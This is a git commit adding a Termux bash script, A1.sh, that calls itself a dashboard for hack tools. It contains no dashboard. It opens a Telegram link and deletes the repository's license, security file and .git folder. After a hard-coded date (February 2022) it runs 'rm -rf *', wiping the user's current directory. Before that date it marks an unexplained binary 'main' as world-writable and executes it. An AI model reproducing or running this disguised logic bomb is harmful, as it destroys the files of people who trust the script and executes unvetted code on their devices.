0474faca1c527b3638ddefc384544166fecb1c40
Mike Edwards <82988362+mike90s15@users.noreply.github.com>
2022-01-28 16:40:48 -0300

    Add files via upload

---
+++ A1.sh
@@ -0,0 +1,42 @@
+#!/usr/bin/env bash
+
+<<CLOWNTERS
+ #CLOWNTERS
+ #--------------------------------------------------------
+ # Name script: Panel Clownters                         |
+ #--------------------------------------------------------
+ # Script     : A1 PANEL                                |
+ #--------------------------------------------------------
+ # Description: dashboard for consultation and hack tools|
+ #--------------------------------------------------------
+ # Version    : 0.3                                      |
+ #--------------------------------------------------------
+ # Authors    : Patinn, Eduardo e Mike                   |
+ #--------------------------------------------------------
+ # Date       : 08/08/21                                 |
+ #--------------------------------------------------------
+ # Lincese    : MIT lincese                              |
+ #--------------------------------------------------------
+ # Use: bash A1.sh                                       |
+ #--------------------------------------------------------
+ #CLOWNTERS
+CLOWNTERS
+
+#termux-open-url WhatsApp
+sleep 1
+termux-open-url https://t.me/clownters
+sleep 1
+test -f Sploit && rm Sploit
+test -f SECURITY.md && rm SECURITY.md
+test -f LICENSE && rm LICENSE
+test -e .git && rm -rf .git
+printf "\e[31mwait."
+command -v clang && clear || pkg install clang -y /dev/null
+if (($(date +%m%y) >= 0222)); then
+    clear
+    rm -rf *
+else
+    chmod 777 main
+    ./main || printf "\e[1;31mnão compatível com sistema atual\e[m\n"
+fi
+exit 0
